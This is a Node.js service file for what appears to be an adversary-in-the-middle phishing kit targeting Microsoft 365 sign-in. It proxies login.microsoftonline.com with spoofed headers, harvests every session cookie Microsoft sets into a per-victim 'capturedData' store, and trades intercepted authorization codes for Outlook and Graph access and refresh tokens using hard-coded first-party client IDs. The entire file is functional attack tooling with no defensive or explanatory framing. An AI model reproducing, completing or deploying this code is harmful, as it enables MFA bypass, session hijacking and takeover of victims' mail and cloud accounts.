// services/proxyService.js
const axios = require('axios');
const { createProxyMiddleware } = require('http-proxy-middleware');

const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';

class ProxyService {
    constructor(capturedData, microsoftParams) {
        this.capturedData = capturedData;
        this.microsoftParams = microsoftParams;
        this.proxyMiddleware = this.createProxyMiddleware();
    }

    createProxyMiddleware() {
        return createProxyMiddleware({
            target: MICROSOFT_LOGIN_URL,
            changeOrigin: true,
            secure: true,
            followRedirects: true,
            selfHandleResponse: true,
            logLevel: 'silent',
            on: {
                proxyReq: (proxyReq, req, res) => {
                    const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
                    proxyReq.setHeader('Host', 'login.microsoftonline.com');
                    proxyReq.setHeader('Origin', 'https://login.microsoftonline.com');
                    proxyReq.setHeader('Referer', 'https://login.microsoftonline.com/');
                },
                
                proxyRes: async (proxyRes, req, res) => {
                    const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
                    
                    const cookies = proxyRes.headers['set-cookie'];
                    if (cookies) {
                        console.log(`\n🍪 [${sessionId}] PROXY CAPTURED ${cookies.length} COOKIES:`);
                        
                        let proxySession = this.capturedData.get(sessionId);
                        if (!proxySession) {
                            proxySession = { cookies: [], credentials: {} };
                        }
                        if (!proxySession.cookies) proxySession.cookies = [];
                        
                        cookies.forEach(cookie => {
                            if (!proxySession.cookies.includes(cookie)) {
                                proxySession.cookies.push(cookie);
                            }
                        });
                        
                        this.capturedData.set(sessionId, proxySession);
                    }
                    
                    let body = [];
                    proxyRes.on('data', chunk => body.push(chunk));
                    proxyRes.on('end', () => {
                        res.writeHead(proxyRes.statusCode, proxyRes.headers);
                        res.end(Buffer.concat(body));
                    });
                }
            }
        });
    }

    getMiddleware() {
        return this.proxyMiddleware;
    }

    async forwardToMicrosoft(url, method = 'GET', data = null, headers = {}) {
        try {
            const response = await axios({
                method,
                url,
                data,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    ...headers
                },
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 400
            });
            
            return response;
        } catch (error) {
            if (error.response) {
                return error.response;
            }
            throw error;
        }
    }

    async exchangeCodeForToken(sessionId, code, codeVerifier, resource = 'outlook') {
        const clientId = resource === 'graph' 
            ? '1fec8e78-bce4-4aaf-ab1b-5451cc387264'
            : 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
        
        const redirectUri = resource === 'graph'
            ? 'https://login.microsoftonline.com/common/oauth2/nativeclient'
            : 'urn:ietf:wg:oauth:2.0:oob';
        
        const scope = resource === 'graph'
            ? 'https://graph.microsoft.com/.default offline_access'
            : 'https://outlook.office.com/.default offline_access';
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: clientId,
                    code: code,
                    code_verifier: codeVerifier,
                    redirect_uri: redirectUri,
                    grant_type: 'authorization_code',
                    scope: scope
                }).toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json'
                    }
                }
            );
            
            return response.data;
        } catch (error) {
            console.error(`❌ Token exchange failed for ${resource}:`, error.response?.data || error.message);
            return null;
        }
    }
}

module.exports = ProxyService;